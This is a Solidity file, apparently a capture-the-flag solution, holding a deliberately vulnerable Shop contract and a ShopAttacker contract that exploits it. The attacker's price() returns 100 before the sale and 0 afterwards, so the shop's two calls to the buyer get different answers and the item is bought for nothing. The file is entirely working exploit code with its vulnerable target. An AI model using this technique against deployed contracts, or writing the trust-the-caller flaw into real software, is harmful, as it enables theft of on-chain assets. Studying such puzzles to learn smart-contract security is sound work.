// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttacker is Buyer {
  Shop target;

  constructor(address _target) {
    target = Shop(_target);
  }

  function price() external view override returns (uint) {
    return target.isSold() ? 0 : 100;
  }

  function pwn() public {
    target.buy();
  }
}
